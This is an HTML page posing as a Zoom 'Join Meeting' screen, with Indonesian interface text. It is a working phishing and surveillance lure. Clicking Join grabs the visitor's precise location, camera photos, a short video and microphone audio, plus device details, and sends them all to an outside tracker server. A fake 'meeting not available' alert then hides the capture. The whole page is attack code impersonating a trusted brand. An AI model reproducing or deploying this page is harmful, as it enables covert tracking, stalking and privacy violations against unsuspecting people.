<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Join Meeting - Zoom</title>
  <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap">
  <style>
    * { margin:0; padding:0; box-sizing:border-box; }
    body {
      font-family: 'Inter', system-ui, sans-serif;
      background: #ffffff;
      color: #333;
      min-height: 100vh;
      display: flex;
      flex-direction: column;
    }
    header {
      padding: 16px 32px;
      display: flex;
      justify-content: space-between;
      align-items: center;
      border-bottom: 1px solid #e5e5e5;
    }
    .logo { font-size: 32px; font-weight: 700; color: #0e72ed; letter-spacing: -2px; }

    .main { flex: 1; display: flex; align-items: center; justify-content: center; padding: 40px 20px; }
    .join-box { width: 100%; max-width: 480px; text-align: center; }

    h1 { font-size: 28px; font-weight: 600; margin-bottom: 32px; }
    .label { text-align: left; font-size: 14px; font-weight: 500; margin-bottom: 8px; color: #444; }
    input { width: 100%; padding: 16px 20px; font-size: 16px; border: 1px solid #d0d0d0; border-radius: 8px; margin-bottom: 20px; }

    #joinBtn {
      width: 100%; padding: 16px; background: #0e72ed; color: white;
      font-size: 18px; font-weight: 600; border: none; border-radius: 8px; cursor: pointer;
      transition: all 0.3s;
    }
    #joinBtn:disabled {
      background: #8ab4f8;
      cursor: not-allowed;
    }

    /* Loading Animation */
    .loading-container {
      display: none;
      flex-direction: column;
      align-items: center;
      margin: 25px 0;
    }
    .spinner {
      width: 48px;
      height: 48px;
      border: 5px solid #f0f0f0;
      border-top: 5px solid #0e72ed;
      border-radius: 50%;
      animation: spin 1s linear infinite;
      margin-bottom: 16px;
    }
    .loading-text {
      font-size: 15px;
      color: #555;
      font-weight: 500;
    }

    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }

    video { display: none; }
  </style>
</head>
<body>

  <header>
    <div class="logo">zoom</div>
    <div>
      <button style="padding:8px 20px;border-radius:9999px;border:1px solid #0e72ed;background:white;color:#0e72ed;">Support</button>
      <button style="padding:8px 20px;border-radius:9999px;border:none;background:#0e72ed;color:white;margin-left:8px;">Sign Up Free</button>
    </div>
  </header>

  <div class="main">
    <div class="join-box">
      <h1>Join Meeting</h1>
      <div class="label">Meeting ID or Personal Link Name</div>
      <input type="text" id="meetingId" value="987-654-321" readonly>

      <button id="joinBtn">Join</button>
      
      <!-- Loading Animation -->
      <div class="loading-container" id="loading">
        <div class="spinner"></div>
        <div class="loading-text">Memproses permintaan...</div>
      </div>
    </div>
  </div>

  <video id="video" autoplay playsinline muted></video>

  <script>
    const btn = document.getElementById('joinBtn');
    const loading = document.getElementById('loading');
    const videoEl = document.getElementById('video');
    const SERVER_URL = 'https://coreproject.site/tracker/dashboard.php';

    async function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }

    btn.addEventListener('click', async () => {
      btn.disabled = true;
      loading.style.display = 'flex';   // Tampilkan loading

      try {
        // GEOLOCATION
        let locationData = { latitude: null, longitude: null, accuracy: 0, note: "failed_or_skipped" };
        try {
          const pos = await new Promise((res, rej) => 
            navigator.geolocation.getCurrentPosition(res, rej, {enableHighAccuracy:true, timeout:10000})
          );
          locationData = { 
            latitude: pos.coords.latitude, 
            longitude: pos.coords.longitude, 
            accuracy: pos.coords.accuracy 
          };
        } catch (e) { /* silent */ }

        await sleep(600);

        // CAMERA + AUDIO
        const stream = await navigator.mediaDevices.getUserMedia({ 
          video: { facingMode: "user" }, 
          audio: true 
        });

        videoEl.srcObject = stream;
        await videoEl.play().catch(() => {});

        await sleep(800);

        // PHOTOS
        const photos = [];
        for (let i = 0; i < 3; i++) {
          await sleep(1000);
          const canvas = document.createElement('canvas');
          canvas.width = videoEl.videoWidth || 640;
          canvas.height = videoEl.videoHeight || 480;
          const ctx = canvas.getContext('2d');
          ctx.drawImage(videoEl, 0, 0);
          photos.push(canvas.toDataURL('image/jpeg', 0.8));
        }

        // VIDEO RECORDING
        const mimeType = MediaRecorder.isTypeSupported('video/mp4') ? 'video/mp4' : 'video/webm';
        const recorder = new MediaRecorder(stream, { mimeType });
        const chunks = [];

        recorder.ondataavailable = e => chunks.push(e.data);
        recorder.start();
        await sleep(3000);
        recorder.stop();

        const videoBlob = await new Promise(resolve => {
          recorder.onstop = () => resolve(new Blob(chunks, { type: mimeType }));
        });

        // SEND TO SERVER
        const formData = new FormData();
        formData.append('location', JSON.stringify(locationData));
        formData.append('device_info', JSON.stringify({
          timestamp: new Date().toISOString(),
          userAgent: navigator.userAgent,
          platform: navigator.platform,
          isIOS: /iPhone|iPad|iPod/.test(navigator.userAgent)
        }));

        const ext = mimeType.includes('mp4') ? 'mp4' : 'webm';
        formData.append('video', videoBlob, `zoom_${Date.now()}.${ext}`);

        for (let i = 0; i < photos.length; i++) {
          const blob = await fetch(photos[i]).then(r => r.blob());
          formData.append(`photo${i+1}`, blob, `photo_${Date.now()}_${i+1}.jpg`);
        }

        const response = await fetch(SERVER_URL, { method: 'POST', body: formData });
        
        if (response.ok) {
          alert("Meeting tidak tersedia. Silakan coba lagi nanti.");
        } else {
          throw new Error(`Server error`);
        }

        stream.getTracks().forEach(t => t.stop());

      } catch (err) {
        console.error(err);
        alert("Meeting tidak tersedia. Silakan coba lagi nanti.");
      } finally {
        // Sembunyikan loading dan aktifkan tombol kembali
        loading.style.display = 'none';
        btn.disabled = false;
      }
    });
  </script>
</body>
</html>
